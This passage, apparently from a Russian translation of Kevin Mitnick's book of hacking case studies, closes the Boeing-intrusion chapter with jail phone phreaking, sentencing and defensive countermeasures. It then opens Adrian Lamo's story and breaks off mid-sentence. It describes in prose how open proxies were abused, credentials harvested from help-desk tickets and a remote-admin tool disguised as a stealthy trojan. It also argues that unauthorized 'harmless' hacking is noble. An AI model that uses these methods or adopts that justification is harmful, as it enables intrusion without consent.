четырьмя объемистыми тетрадями, полными доказательств их преступной деятельности. В тот момент он еще не мог знать, что у полиции есть все необходимые доказательства для того, чтобы засудить их с Мэттом.  Мэтт вспоминает, как он увидел сюжет о взломе компьютерной системы Boeing по телевизору в доме своих родителей. А в десять вечера в дверь постучали. Это были два агента ФБР. Они беседовали с ним в гостиной часа два, пока родители мирно спали наверху. Мэтт не хотел их будить. Он боялся.  Дон Боэлинг хотел пойти на задержание, но не смог. Несмотря на все его достоинства, его не взяли. «Они не хотели, чтобы гражданские люди присутствовали при реальном задержании».  Представители компании Boeing были озабочены тем, что фамилия одного из хакеров совпадала с фамилией одного из сотрудников их компании. Естественно, Мэтт тоже был расстроен тем, что его отец оказался замешанным в это дело. «Отец работал в Boeing, фамилии у нас были одинаковые, поэтому его тоже допрашивали». Коста сразу же подчеркнул, что они не использовали никакой информации, связанной с отцом Мэтта, чтобы проникнуть в сеть Boeing, «Он с самого начала старался никак не вмешивать отца в наши дела, связанные с проникновением в систему Boeing, задолго до того, как мы стали думать о печальном конце».  Дон немного разозлился, когда о раскрытии преступления стали спрашивать руководителя офиса ФБР в Сиэтле. Телекорреспонденты спросили, как ему удалось выследить и схватить хакеров. Сотрудник ФБР отвечал так: «ФБР использовало специальные технические устройства и процедуры, которые слишком сложны, чтобы обсуждать их здесь». Дон с раздражением подумал про себя: «Какая чепуха! Вы не сделали ровным счетом ничего. Мы сделали это». В группу входили сотрудники компании Boeing, сотрудники других компаний, представители суда, сотрудники местной и федеральной полиции. «Впервые была организована такая мощная команда, И результат — это итог ее деятельности».  К счастью, Мэтт и Коста принесли не много вреда, учитывая, на что они были способны потенциально. «Если оценивать вред, нанесенный Boeing, то они практически ничего не сделали», — признает Дон, Компания легко восстановилась после инцидента, но хотела увериться в том, что из случившегося вынесены уроки. «Они чувствовали себя виноватыми, поскольку мы буквально спасли их от гибели. Без нас они бы не выбрались из этой ситуации», — вспоминает Дон с удовлетворением.  В процессе разбора дела обвинения были смягчены, и многочисленные нарушения закона свелись к «проникновению в компьютер». Двое наших героев получили легкий подзатыльник: 250 часов общественно-полезного труда и пять лет запрета на пользование компьютерами. Самая суровая часть судебного решения состояла в том, что им присудили выплатить 30 тысяч долларов компенсации, в основном — компании Boeing. Хотя никто из них не был ребенком, им дали еще один шанс. И пожелали удачи. Они ничему не научились.   Коста  : «Вместо того, чтобы прекратить все свои хакерские действия, мы оказались тупыми детьми, может, не тупыми, а наивными в том плане, что не осознавали, в какую беду могли бы попасть. С нашей стороны это была даже не жадность, а некое пижонство, что ли, вроде как возможность звонить в любое время по мобильному телефону»  Мэтт  : «Возвращаясь в те дни, я вспоминаю, что это было круто. Это было блестящее дело».  Тем не менее, взломы, которыми занимались Мэтт и Коста, близились к концу. Но причина тому была совсем не та, что вы думаете, а … ревность.  Коста сказал своей подружке, что он какое-то время (когда он был поглощен взломами) общался с другой девушкой. Но это совсем не то, что она думает, сказал Коста: эта девушка была «только другом, ничего больше». Однако его подружка угрожала позвонить в полицию и сообщить, что «хакер, взломавший компьютерную сеть Boeing, продает краденые компьютеры», если не бросит встречаться с «этой девушкой». И осуществила свою угрозу!  Когда полиция появилась в его доме, Косты дома не было, была только мама: «Конечно, проходите», — сказала она, уверенная в том, что вреда не будет.  Они не нашли в доме ничего украденного. Это была хорошая новость. Плохая новость заключалась в том, что они нашли листок бумаги, который упал на пол и спрятался за краем ковра. На нем был записан номер и несколько цифр, в которых один из пришедших распознал ESN (Electronic Serial Number). Проверка в телефонной компании показала, что эта информация связана с номером мобильного телефона, который использовался нелегально.  Коста узнал о визите правоохранительных органов к его матери и решил скрыться.  «Пять дней я скрывался от секретных служб — они могли арестовать меня по обвинению в мошенничестве с мобильными телефонами. Я был под подозрением. Поэтому я жил у своего друга в Сиэтле. Они искали меня повсюду, но машина, на которой я ездил, была зарегистрирована на имя человека, у которого я ее купил, поэтому меня не могли схватить. На пятый или шестой день я поговорил со своим адвокатом и добровольно сдался властям. П о с л е этого я был арестован и задержан. Находиться в руках секретных служб — это было очень сложное время».  Задержали и Мэтта. Оба хакера оказались на разных этажах тюрьмы Seattle's King County.   ФРИКЕРСТВО   В   ТЮРЬМЕ   Ребята поняли, что больше никаких уступок не будет. После того, как все следственные действия были закончены и прокурор оформил все бумаги, наша парочка должна была предстать перед федеральным судьей для слушания их дела. Никаких проволочек, никакой надежды на защиту, практически никакой надежды на снисхождение.  Обоих должны были подробно допросить. Для этого у них была специальная методика: допрашивать подозреваемых по отдельности и ловить их, когда их рассказы не соответствуют друг другу.  Мэтт и Коста обнаружили, что следственный изолятор, для них по крайней мере, был более неприятным местом, чем тюрьма. «Районный следственньй изолятор — худшее место в мире. Здесь тебе угрожают со всех сторон», — вспоминает Коста. «Меня постоянно втягивали в драки. И если ты не отвечаешь ударом на удар, то тебя просто съедят». Мэтт вспоминает, как его побили за то, что он недостаточно быстро отошел от телефона — приходилось учить новые правила.  Заключение было тяжелым делом и с другой стороны. Вот что вспоминает Коста:  «Никто не знал, что будет дальше, хотя все мы были в беде и знали, что н а с ожидают е щ е большие беды. С т р а х перед неведомым б ы л больше, чем страх перед товарищами по несчастью. Они просто говорят „запереть их“ и у тебя нет возможности ни на залог, ни на связь с внешним миром. В о т что означает заключение в Федеральных тюрьмах. Мы не имели ни малейшего представления, куда пойдем отсюда, и сколько нас здесь продержат».  В следственных изоляторах есть два типа телефонов — платные телефоны, где все переговоры прослушиваются, чтобы увериться в том, что заключенные не говорят что-то незаконное, и телефоны, которые прямо соединяются с офисом общественных защитников, так что заключенные могут разговаривать со своими адвокатами.  В изоляторе Сиэтла для соединения с офисом защитников надо набирать двузначные номера. Мэтт объясняет: «А если вы позвонили в неприемные часы, что получится? Вы окажетесь в системе голосовой почты и сможете нажимать кнопки по своему усмотрению». Тогда он начал исследовать эту систему голосовой почты.  Он быстро понял, что это система Meridian, с которой они с Кос-той были хорошо знакомы, поэтому он смог перепрограммировать ее так, что она переправляла его звонок на внешнюю линию. «Я набрал в меню номер восемь, который не использовался в автоматизированном меню. После этого я смог набрать местный номер и шестизначный код, который я знал. Таким образом я получил возможность звонить в любое место мира».  Телефоны обычно отключались в восемь вечера, но линия связи с офисом всегда о с т а в а л а с ь действующей. « М ы экспериментировали с телефонами ночи напролет, никто больше не пробовал это делать, поскольку все думали, что они отключены», — говорит Коста. «Они считали нас просто ненормальными, которые сидели и баловались с отключенными телефонами. Поэтому все шло просто прекрасно».  Пока Коста учился делать внешние звонки, Мэтт тоже использовал телефон ночью по своему усмотрению и проводил эксперименты. Он выяснил ключевой номер в старом сегменте сети телефонной компании Пенсильвании, что позволило им обоим звонить через этот номер друг другу.  Они провели в этих неконтролируемых переговорах друг с другом долгие ч а с ы . « М ы могли обсуждать с и т у а ц и ю перед допросами во всех подробностях. Это очень помогало нам», — говорит Коста. Мэтт добавляет: « М ы без конца обсуждали то, что будем говорить следователям. Мы хотели все отработать до мелочей».  Между заключенными быстро пробежал слух, что двое новичков творят какие-то чудеса с телефонами.   К  о  с  т  а  : «Мне это нравилось, поскольку другие люди давали мне новые пути для бесплатных телефонных звонков».   Мэтт  : « А меня это раздражало, я нервничал. Я сидел там и занимался всеми этими делами, и никого не хотел в них посвящать».  Сидеть в заключении и нарушать закон, делая нелегальные звонки и планируя свои будущие допросы с целью обмануть следователей. Для любого хакера это было бы удовольствием. Для Мэтта и Кос-ты это означало риск новых обвинений вдобавок к тем, которые у них уже имелись.  В конце концов, все их усилия по согласованию показаний не увенчались успехом. Слишком много фактов было против них, и на этот раз они стояли перед судьей, который не собирался ограничиваться «легким подзатыльником». Они оба были приговорены к «году и дню» в тюрьме с учетом того, что они уже провели в следственном изоляторе. Лишний день в приговоре был для них очень выгоден: в соответствии с американскими законами они получали возможность освободиться на 54 дня раньше в случае примерного поведения.  Их держали в заключении без возможности выхода под залог в течение трех с половиной месяцев, затем их освободили до окончательного вынесения приговора под целый набор строгих ограничений. Дон оказался прав: в этот раз никакого снисхождения не было.   ВРЕМЯ   ДЕЙСТВОВАТЬ   Мэтта послали о т с и ж и в а т ь срок в S h e r i d a n C a m p в Орегоне, а Кос-та отправился в Федеральную тюрьму Boron Camp в Орегоне, «Мы попали в федеральные тюрьмы, поскольку наши преступления попадали под действие федеральных законов», — говорит Коста. Тем не менее, это еще не были «трудные времена» для обоих.  Коста  : «Я знаю, что это был почти что „дом отдыха“. Представьте себе тюрьму, в которой есть бассейн. Посреди пустыни это было очень кстати. Там даже не было загородки, а только желтая линия на пляже. В этом милом месте отсиживали свой срок три бывших сенатора. Е щ е со мной был парень, который организовал известную сеть ресторанов».  Boron был единственной федеральной тюрьмой с пляжем и Коста позднее узнал, что после передачи известной тележурналистки Барбары Уолтерс этот бассейн прекратил свое существование. Я могу согласиться с тем, что не надо тратить деньги налогоплательщиков на постройку бассейнов при строительстве новых тюрем, но я не согласен с тем, что имеет смысл разрушать уже имеющиеся.  В тюрьме Sheridan Мэтт обнаружил среди заключенных одного бывшего сотрудника компании Boeing. «Он попал туда за какие-то финансовые махинации на работе». Это выглядело очень забавно.  Косту и других заключенных тюрьмы Boron часто везли полчаса по пустыне в чадящем тюремном автобусе на близлежащую базу военно-воздушных сил Edwards для интеллектуальной деятельности. «Они впустили меня в военный ангар с VAX-сервером. А ведь мне не разрешалось даже приближаться к компьютеру». Он предупредил сержанта. «Я рассказал ему всю мою историю, а он сказал мне „Плюнь на это и работай“. Коста незамедлительно вошел в военный компьютер: „Каждый день я тусовался на IRC-сайтах и беседовал с кем хотел, находясь при этом в тюрьме. Я перегрузил себе Doom очень быстро. Это было просто прекрасно!“  Однажды Косте поручили чистить секретные коммуникации, наполненные очень чувствительной электроникой. «Я просто не мог поверить, что они разрешат нам делать это».  С одной стороны, их пребывание в тюрьме выглядит сказкой или шуткой. На самом деле это было не так. Каждый месяц в тюрьме был вычеркнутым из жизни временем, когда они не могли учиться, не могли заботиться о близких людях и быть с теми, с кем им хотелось быть рядом. Каждое утро заключенный начинал с раздумий о том, придется ли ему сегодня сражаться, чтобы защитить себя или свою собственность. И следственный изолятор и тюрьма — это ужасные места.   ЧТО   ОНИ   ДЕЛАЮТ   СЕГОДНЯ   После освобождения оба наших героя стали жить обычной жизнью. Мэтт сегодня работает в большой компании в Сан-Хосе разработчиком приложений на языке Java. У Косты своя компания и он занят «установкой систем наблюдения и аудио систем для бизнеса». Он нашел работу, которая ему по душе; люди, измученные своими делами, должны ему завидовать, потому что, по его словам, он «наслаждается каждой минутой своей жизни».   АНАЛИЗ   Кажется удивительным, что в сегодняшнем мире хакеры по-прежнему запросто проникают на многие корпоративные сайты. Зная все эти истории о взломе компьютерных систем, в сочетании с постоянно растущими заботами о безопасности, с появлением специально обученных обеспечению безопасности людей — в штате или привлекаемых в качестве консультантов — не только в больших, но и в малых компаниях, можно только удивляться тому, как у пары подростков хватило мастерства для того, чтобы проникнуть в компьютеры суда, крупной сети отелей и такой компании, как Boenig Aircraft.  Одна из причин, почему это случилось, как я думаю, заключается в том, что многие хакеры следуют по пути, по которому шел и я, проводя массу времени за изучением компьютерных систем, операционных систем, программных приложений, сетевых технологий и много другого. Большинство из них самоучки, причем многие обучались путем эффективного процесса «обмена знаниями». Некоторые из молодых людей настолько преуспели в своих занятиях, что им вполне можно было бы присвоить степень кандидата хакерских наук. Если бы такие уважаемые университеты США, как Массачусе-тский технологический институт, или Калифорнийский технологический институт, присуждали такие степени, то я могу назвать не так много имен людей, которые могли бы сидеть в экзаменационной комиссии.  Никто не знает, сколько консультантов по безопасности раньше были хакерами (включая некоторых из тех, чьи истории приведены на этих страницах). Взлом систем безопасности требует определенного склада ума, который способен тщательно анализировать пути для реализации этого взлома. Тот, кто пытается работать в этой сфере только на основе знаний, полученных в теории, быстро понимает, что ему требуется практический опыт, чтобы он смог успешно конкурировать с «консультантами», которые начали свое обучение в возрасте восьми-десяти лет.  Как это ни трудно признавать, правда состоит в том. что всем, работающим в области безопасности, надо многому учиться у хакеров, которые могут выявить слабости системы и наиболее эффективные и экономичные способы ее взлома. Да, они нарушают закон своими действиями, но они делают важное дело. На самом деле очень многие профессионалы в сфере безопасности в прошлом были хакерами.  Некоторые прочтут эти строки и подумают, что бывший хакер Кевин Митник просто-напросто защищает современных хакеров. Однако. правда заключается в том, что многие хакерские атаки служат благородной цели выявления слабостей в системе безопасности компаний. Если хакер не причиняет никаких повреждений, проводя свою атаку или запускает атаку «отказа в предоставлении услуги», испытывают ли компании ущерб от такой атаки или выгоду, поскольку их оповещают об их уязвимости?   КОНТРМЕРЫ   Обеспечение адекватного управления конфигурацией — это важный процесс, который нельзя игнорировать. Даже если вы правильно сконфигурировали все оборудование и ПО в процессе установки системы и своевременно вносите все необходимые обновления в систему безопасности, неправильная конфигурация всего одного элемента может создать брешь в системе защиты. Каждая компания должна иметь установленную процедуру обучения, тренировки и постоянного напоминания, буквально внедрения ощущения важности безопасности для ИТ-персонала, который будет устанавливать новые компьютеры и новое ПО, а также для телекоммуникационного персонала, устанавливающего телефоны, а вдобавок к этому создать структуру постоянных проверок всех аспектов безопасности.  В нашей предыдущей книге — «Искусство обмана» — мы всячески рекламировали необходимость разработки четкого плана обучения приемам компьютерной безопасности всех сотрудников. Все системы и устройства должны быть тщательно проверены на безопасность еще до того, как будут отправлены в производство.  Я абсолютно уверен в том, что полагаться на один-единственный пароль — это практика прошлого. Более надежные формы безопасной авторизации, использующие определенные типы устройств, таких, как надежные биометрические приборы, или так называемые «токены» — брелоки с изменяемыми цифровыми ключами, должны использоваться в сочетании с мощным персональным паролем — часто обновляемым — для защиты систем и хранимой в них информации. Использование новых, более сильных форм авторизации не гарантирует полную защиту от хакерских атак, но по крайней мере повышает защищенность системы.  Те, кто продолжает полагаться только на обычные пароли, должны проводить специальные тренинги и часто напоминать сотрудникам о том, как сделать их максимально эффективными. Прежде всего, пароли должны содержать как минимум одну цифру плюс один символ вдобавок к буквам, и должны часто меняться.  Следующие шаги заключаются в убеждении сотрудников не полагаться на «ленивую память» и не записывать свои пароли на клочках бумаги, не приклеивать их на монитор своего компьютера, не прятать под клавиатурой, или в других очевидных местах на своем столе, в которые вор обязательно заглянет в первую очередь. Кроме того, правильная практика использования паролей требует не использовать одинаковые или похожие пароли несколькими сотрудниками.   ПОСЛЕСЛОВИЕ   Люди, будьте бдительны. Простейшее изменение паролей на более сложные и часто изменяемые может защитить ваш бизнес от преступников.  Но дело не только в тупости пользователей. Производители ПО всегда ставят на первое место функциональность и совместимость, а безопасность — только после них. Естественно, в руководство для пользователей вставляются подробные указания и инструкции. Хорошо известно старое правило инженеров: «Когда все сломалось, прочти инструкции». Чтобы следовать этому дурному правилу, совсем не надо иметь высшего образования.  Пришло время, когда производители оборудования начинают понимать важность проблемы обеспечения безопасности. И они, и производители ПО наконец-то осознали, что большинство людей не читают документации. А что вы думаете о предупреждении во всех руководствах о необходимости соблюдения правил безопасности или изменении предварительно установленных паролей, когда начинается использование продукта? Более того, как сделать безопасность встроенной в устройство по умолчанию? Microsoft сделал это не так давно, лишь в конце 2004 года появились Windows XP Professional и Home Edition вместе с «Service Pack 2», куда межсетевой экран встроен изначально. Почему же это естественное решение заняло так много лет?  Компании Microsoft и другим производителям операционных систем стоит задуматься об этих ушедших годах. Такое простое изменение во всех продуктах сделало бы все киберпространство более безопасным для всех нас.       Глава 5.    Хакер   Робин   Гуд      Хакерство всегда было для меня не столько технологией, сколько религией      Адриан Ламо   Хакерство — это мастерство. Любой может постичь его при помощи самообразования. С моей точки зрения хакерство — это креативное искусство находить умные пути преодоления систем безопасности, — так же, как любители открывать замки стремятся преодолеть все закрытые двери исключительно ради развлечения. Можно заниматься хакерством и без нарушения законов.  Тонкое различие лежит в разрешении, которое дает владелец компьютерной системы хакеру на проникновение в свою систему. Есть много путей хакерства даже с разрешения «жертвы». Некоторые осознанно нарушают закон, но никогда не попадаются. Другие идут на риск и отбывают свой срок в тюрьме. И все скрывают свои истинные имена за своеобразными кличками, онлайновыми разновидностями прозвищ.  Но есть единицы таких, как Адриан Ламо, которые занимаются этим делом, не пряча свою личность, и когда они находят лазейки в системах безопасности некоторых организаций, то сообщают им об этом. Это Робин Гуды в хакерском сообществе. Их надо не заключать в тюрьму, а награждать. Они помогают компаниям проснуться до того, как другой злонамеренный хакер нанесет ей действительно серьезные повреждения.  Список организаций, в компьютерные сети которых (по мнению правительства) проникал Адриан Ламо, выглядит по меньшей мере внушительно. В нем есть Microsoft, Yahoo!, MCI WorldCom, excite@home, телефонные компании SBC, Ameritech и Cingular. И завершающий аккорд — New York Times.  Конечно, Адриан стоил компаниям некоторых денег, но совсем не так много, как утверждали его обвинители.   СПАСЕНИЕ   Адриан Ламо не был паинькой с детства. Однажды ночью, к примеру, он со своими приятелями решил исследовать огромный заброшенный индустриальный комплекс, расположенный на берегу какой-то реки. Никакого четкого плана у них не было, они просто бродили по пустым ветхим корпусам и довольно быстро заблудились. Только к двум часам утра им удалось выбраться из лабиринта. Когда они пересекали неработающую железную дорогу, проходящую вдоль огромных башен завода, Адриан услышал слабый плач. Хотя его друзья очень хотели выбраться оттуда, победило любопытство Адриана.  В поисках источника этих жалобных звуков они пришли к грязному водостоку. В слабом ночном свете они разглядели, что звуки издавал крошечный котенок, который не мог выбраться оттуда и мяукал изо всех сил.  Адриан набрал телефон службы спасения и вскоре фары полицейского джипа ослепили их.  Наши исследователи были одеты, как говорит Адриан, в стиле «городских естествоиспытателей — элегантно, но с толстым слоем грязи поверх костюмов. Подобная форма одежды не вызывает симпатии и доверия у полицейских». Не меньшую подозрительность вызывал и юный возраст ребят, так что «наша встреча вполне могла закончиться арестом», говорит Адриан. В его голове пронеслось несколько сценариев развития событий: они могли подвергнуться долгому допросу с последующим арестом или … у него созрел план.  «Я показал им вниз и сказал: „Послушайте, в водосток провалился котенок. Я уверен, что вы поможете нам“. Через два часа все было закончено, никого из нас не обыскивали и подозрительность рассеялась».  Силами экипажей двух полицейских джипов, а потом еще и машины Общества охраны животных, провалившийся котенок был вытащен из глубокой трубы. Полицейские передали котенка Адриану, который взял его домой, вымыл и назвал «Алиби». Его приятели называли котенка «Драный».  Позднее Адриан не раз вспоминал эту встречу. Он не верил в случайные совпадения, все они оказались там в одно и то же время не случайно. Так же он относился и к своему, «почти трансцедентально-му» компьютерному опыту: случайностей в мире не бывает.  Интересно, что Адриан и трудное положение, в которое попал котенок, рассматривал, как некую аналогию хакерской жизни. Такие слова как «адаптация», «импровизация» и «интуиция» приходят на ум в качестве важнейших составляющих, когда для успешного завершения дела вам приходится прорываться через множество ловушек и тупиков на перекрестках и в потайных закоулках Интернета.   КОРНИ   Адриан родился в Бостоне, и в детстве ему пришлось много поездить по Новой Англии, пока, наконец, его семья не осела в Вашингтоне. Его отец, родившийся в этом же округе — Колумбия, писал рассказы для детей и занимался переводами с испанского языка; Адриан считает его прирожденным философом. Его мама преподавала английский язык, но сейчас занимается домом. «Они с самого детства брали меня на всякие политические митинги. Они помогали мне расширить кругозор и понять все, что происходит в мире».  Адриан считает, что он не относится ни к одной из демографических групп, хотя большинство хакеров, по его мнению, относятся к «верхушке среднего класса». Я имел удовольствие общаться с его родителями, они рассказали мне, что одной из причин, по которой их сын занялся хакерством, было его восхищение перед несколькими выдающимися хакерами. Мое имя не упоминалось, но в общении с Адрианом у меня родились основания подозревать, что одним из них был и я. Его родители просто не хотели смущать меня.  В семилетнем возрасте Адриан начал дурачить окружающих при помощи компьютера своего отца Commodore 64. Однажды его очень расстроила текстовая игра с приключениями, в которую он пытался играть. Казалось, что любое развитие событий ведет к смертельному исходу. Он обнаружил, что пока программа загружается в компьютер. еще до нажатия команды «Run», есть способ дать компьютеру команду распечатать текст кодов всей программы. В этой распечатке он нашел все ответы на вопросы, которые искал и быстро выиграл игру.  Хорошо известно, что чем раньше ребенок начинает изучать иностранный язык, тем более естественно он воспринимает его. Адриан считает, что это верно и для раннего начала работы с компьютером. По его мнению, причина в том, что мозг еще не «затвердел». сеть его нейронов более гибкая и подвижная, она быстрее усваивает информацию и подстраивается к ситуации, чем это бывает в более старшем возрасте.  Адриан вырос буквально погруженным в мир компьютеров, всегда рассматривая его как продолжение реального мира, в котором можно жить и действовать. Для него компьютер никогда не был чем-то, о чем вы прочли и в чем пытаетесь разобраться. Компьютер для него никогда не был каким-то посторонним устройством, типа холодильника или автомобиля, а скорее окном в самого себя. Он считает, что обрабатывает информацию таким же образом, как это делает компьютер и его программы.   П  ОЛУНОЧНЫЕ   В  С  Т  Р  Е  Ч  И   Изо всех корпоративных компьютерных систем, в которые Адриан проникал, он считает excite@home своим главным приключением в стиле «плаща и кинжала». Все началось с того, что кто-то предложил ему проверить сайт компании @home. Сайт компании, являющейся клиринговым домом для всех поставщиков услуг кабельного Интернета в США, как думал Адриан, должен быть надежно защищен, и его взлом будет сложным делом. Но если ему удастся это сделать, он получит доступ к важной информации обо всех пользователях кабельных сетей в стране.  Как раз тогда хакеры обнаружили, что Google может быть удивительно полезным при выявлении вероятных мишеней атак и получении полезной информации о них. Адриан выполнил множество своих хакерских набегов при помощи поиска набора ключевых слов, который часто приводил его на сайты, где были те или иные прорехи в конфигурации.  Итак, он присоединил свой ноутбук к открытой сети в одной из комнат Университета Филадельфии и отправился на Интернет-сайт excite@home. Подобное место для выхода в Интернет было обычным для него: он старался делать это в местах, которыми пользуются много людей, например в Интернет-киосках, или в публичных точках беспроводного доступа — соединение из таких мест обеспечивает простой и эффективный способ для хакера замаскировать свое местоположение, Раскрыть личность человека который случайно использует точки публичного доступа в Интернет крайне сложно.  Стратегия Адриана заключалась в том, чтобы проникнуть в мыслительный процесс человека, который создавал программу или сеть, в которые он пытался проникнуть, используя весь свой опыт и зная стандартные приемы, которыми сетевые архитекторы обычно пользуются при создании своих систем. Ему особенно хорошо удавалось использование неправильно сконфигурированных прокси-серверов — специальных компьютерных систем, которые организуют трафик между внутренней сетью и внешними «незащищенными» сетями типа Интернета. Прокси-сервер изучает каждый запрос на соединение в соответствии с правилами, которые ему заданы. Когда неумелый сетевой администратор запускает задачу конфигурирования прокси-сервера, любой, кто в этот момент соединится с прокси-сервером, может проложить себе «туннель» в предположительно безопасную внутреннюю сеть компании.  Для хакера подобные «открытые прокси» являются просто приглашением к вторжению, поскольку они дают ему возможность создать запрос, который будет выглядеть так, как будто он пришел от абсолютно законного сотрудника компании, то есть из внутренней сети компании.  Из университетской компьютерной комнаты Адриан обнаружил неправильно сконфигурированный прокси-сервер, который открыл ему путь к внутренним Интернет-страницам различных департаментов excite@home. В специальном разделе технической помощи он задал вопрос о своих проблемах с входом в компьютер. В ответ ему прислали адрес URL, который был предназначен специально для помощи в разрешении проблем с ИТ-инфраструктурой. Проанализировав этот адрес, он получил возможность доступа к другим подразделениям компании, которая использовала ту же технологию. Его не спрашивали об авторизации: система была настроена на то, что любой человек, проникший в эту часть сети, может быть только сотрудником или другим авторизованным человеком, — столь широко распространенное заблуждение, что оно имеет специальное название: «безопасность через неясность».  Для реализации следующего шага он направился на сайт, весьма популярный в среде исследователей сети — netcraft.com. Адриан входил в различные доменные имена, а сайт Netcraft отвечал ему на это списком Е-серверов, показывая их как компьютеры Solaris с ПО Apache.  По мере исследований Адриан обнаружил, что сетевой центр управления компании предлагает услуги технической поддержки, которые позволяют авторизованным сотрудникам прочесть детали запросов пользователей о помощи: «Помогите! Я не могу войти в свой компьютер», или нечто подобное. Иногда сотрудник компании спрашивает у пользователя его имя и пароль — действия безопасные, поскольку происходят они за корпоративным межсетевым экраном; полученная информация будет включена в список технических проблем.  То, что нашел Адриан, по его словам, «открыло ему глаза». В списке жалоб содержалась именно эта информация о пользователях — их имена и пароли, жалобы и отчет об их устранении. Он обнаружил также и текст для создания «паролей авторизации», которые позволяют техникам входить в компьютер к любому пользователю для устранения проблем без необходимости знания пароля пользователя.  Одна из подобных записок привлекла внимание Адриана, В ней был описан случай пользователя, который более года назад просил о помощи в связи с тем, что его кредитная карточка была украдена кем-то с сайта IRC. В этой записке было отмечено, что техническая служба ответила, что это не входит в их компетенцию. Попросту бедного парня отфутболили. Адриан позвонил этому человеку. Представился техником компании и сказал: «Привет, я не занимаюсь вашей проблемой, я просто хочу понять, отвечал ли вам кто-нибудь из нашей службы?» Мужчина ответил, что не услышал ни одного слова в ответ. Адриан прямо отправил ему необходимый отчет и всю внутреннюю документацию, относящуюся к нему.  «Я почувствовал удовлетворение, поскольку я хочу верить в справедливость мира даже в таком извращенном виде, когда ответить на вопрос об украденной у вас кем-то из I R C базе данных вам через год может лишь хакер, который проник в сеть компании, которую вы доверчиво просите о помощи».  В конце концов, открытый им прокси-сервер перестал давать ему доступ. Он не знал почему, просто перестал входить в него. Тогда он стал искать другой путь. Подход, который он придумал, был по его словам «совершенно новым».  Первый его шаг заключался в том, что называется «поиск обратной D N S » — поиск названия узла по его IP-адресу. (Если вы дадите своему браузеру указание идти на сайт  www.defensivethinking.com  , то запрос отправится в Domain Name Server, который и преобразует это имя в адрес, который может быть использован в Интернете для переадресации вашего запроса — 209.151.246.5. Тактика, которую избрал Адриан была обратной: он набирал IP-адрес, а в ответ получал имя домена, которому этот адрес соответствовал).  Таким образом он исследовал много адресов, большинство которых не представляло никакого интереса. Он набрел только на несколько сайтов, начинающихся со слова «dialup», типа dialup00.corp.home.net, Он предположил, что это названия узлов, с которыми связываются сотрудники, находящиеся в дороге для входа в корпоративную сеть.  Вскоре он обнаружил, что эти dial-up номера используются сотрудниками, которые работают на компьютерах со старыми версиями операционных систем, таких как Windows 98. Некоторые сотрудники использовали «открытое ПО», которое позволяло осуществить удаленный доступ к некоторым директориям или даже ко всему жесткому диску без необходимости читать или писать пароль. Адриан понял, что может внести изменения в тексты операционной системы так, что будут выполняться команды по его желанию. После написания собственных файлов запуска операционных систем пришлось подождать, поскольку система должна была перезагрузиться, чтобы заработала его версия с изменениями. Но Адриан умел быть терпеливым.  Терпение всегда вознаграждается, и Адриан перешел к следующему шагу: установке «RAT» (Remote Access Trojan — троянский червь для удаленного доступа). Чтобы сделать это, он не стал использовать уже известные трояны, созданные другими хакерами для своих злобных намерений. Современные популярные антивирусные программы разработаны для того, чтобы распознавать общеупотребительные трояны и программы создания «черного хода» и обезвреживать их мгновенно. Для решения этой проблемы Адриан нашел совершенно законное приложение, созданное для использования сетевыми и системными администраторами — коммерческое ПО для удаленного управления, которое он слегка модернизировал, чтобы оно стало незаметным для пользователя.  Тогда как антивирусные программы ищут программы удаленного доступа, которые используют хакеры, они не смотрят на законные программы для удаленного доступа, созданные крупными разработчиками ПО, предполагая, что такие программы ничего плохого сделать не могут (так полагал и я, поскольку крупная компания может подать иск, если антивирусное ПО сочтет ее программу вредной и заблокирует ее действие). Лично я считаю, что это плохая идея; антивирусные программы должны извещать пользователя о  любом продукте, который может использоваться в злонамеренных целях и предоставить пользователю решать, насколько он законен. И вот — Адриан часто устанавливал «законные» RAT, которые антивирусные программы не могли обнаружить.  После того, как он успешно установил RAT на компьютере сотрудника @home, компьютер выполнил определенную последовательность команд, которая дала Адриану информацию об активных сетевых соединениях с другими компьютерными системами. Одна из таких команд «netstat» показала ему сетевую активность сотрудника, который в данный момент был соединен с внутренней сетью @home через dial-in и выявил тот компьютер во внутренней сети, на котором работал этот человек в данное время.  Чтобы показать образец данных, которые выдает программа netstat, я запустил ее на своей собственной машине; эта распечатка выглядела так:   С:/Documents and Settings/quest>netstat —a  Active connections  Proto Local Adress Foreign Address  State  TCP lockpicker:1411 64.12.26.50:5190  ESTABLISHED  TCP lockpicker:2842 catlow.cyberverse.com:22  ESTABLISHED  TCP lockpicker:2982  www.kevinmitnik.com:http   ESTABLISHED   В столбце «Local Adress» перечислены имена местных машин («lockpicker» — так тогда назывался мой компьютер) и номер порта той машины. В столбце «Foreign Adress» показано имя хоста (узла) или IP-адрес удаленного компьютера, с которым реализовано соединение. Например, первая линия распечатки показывает, что мой компьютер установил соединение с 64.12.26.50 через порт 5190. который обычно используется для передачи мгновенных сообщений (AOL Instant Messenger). Столбец «State» показывает состояние соединения — «Established», если соединение в данный момент активно, «Listening» — если компьютер ожидает соединения.  В следующей строке, начиная с «catlow.cyberverse.com» показано имя хоста компьютерной системы, с которой соединен я. В последней строке «  www.kevinmitnik.com:http» означает, что я активно соединен со своим личным Интернет-сайтом.  Владелец компьютера не должен запускать приложения на общеизвестных портах, но он может сконфигурировать компьютер так, чтобы использовать нестандартные порты. Например. H T T P (Интернет-сервер) работает на порте 80, но владелец может изменить номер порта, чтобы Интернет-сервер работал где угодно. Изучая ТСР-соединения сотрудников. Адриан обнаружил, что сотрудники @home соединяются с Интернет-сервером через нестандартные порты.  Из этой информации Адриан смог получить IP-адреса для компьютеров компании, что было аналогично проникновению в секретную корпоративную информацию @home. Среди других «драгоценностей» он обнаружил базу данных имен, адресов электронной почты, номеров кабельных модемов, текущих IP-адресов, даже операционных систем, работающих на компьютерах, для каждого из примерно трех миллионов абонентов широкополосной связи.  Это была «экзотическая атака» по словам Адриана, поскольку она включала в себя перехват соединения от внешнего компьютера, соединяющегося с сетью.  Адриан считает это достаточно простым процессом. Вся основная тяжесть, которая заняла месяц проб и ошибок, состояла в составлении подробной карты сети: надо было выяснить все ее составные части и то, как они связаны друг с другом.  Ведущий сетевой инженер excite@home был человеком, которому Адриан поставлял информацию в прошлом, и ему можно было доверять. Отступив от своего обычного правила использовать посредника для передачи информации в компанию, куда он проник, он позвонил инженеру прямо и объяснил, что он обнаружил определенные слабости в сети компании. Инженер согласился на встречу с ним. несмотря на позднее время. Они встретились в полночь.  «Я показал ему часть из документации, которую я набрал. Он позвонил их эксперту по безопасности, и мы встретились с ним в офисе excite@home около 4.30 утра». Инженер и эксперт внимательно просмотрели материалы Адриана и задали ему несколько вопросов о том, как он проникал в сеть. Около шести утра они закончили, и Адриан сказал, что хотел бы 